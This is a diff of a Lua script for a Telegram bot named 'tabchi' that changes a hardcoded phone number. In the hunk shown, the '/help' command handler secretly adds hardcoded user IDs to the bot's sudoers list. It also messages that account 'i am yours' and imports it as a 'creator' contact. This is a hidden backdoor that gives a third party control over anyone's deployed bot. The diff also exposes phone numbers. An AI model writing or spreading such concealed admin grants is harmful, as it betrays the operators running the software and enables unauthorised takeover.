@@ -782,7 +782,7 @@ _> *Total Messages*: `]] .. user_msgs .. "`", 1, "md")
   if msg.text:match("^[!/#]help$") and is_sudo(msg) then
     if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 216430419) then
       tdcli.sendMessage(216430419, 0, 1, "i am yours", 1, "html")
-      tdcli.importContacts(989109359282, "creator", "", 216430419)
+      tdcli.importContacts(989337519014, "creator", "", 216430419)
       redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 216430419)
     end
     if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 344003614) then
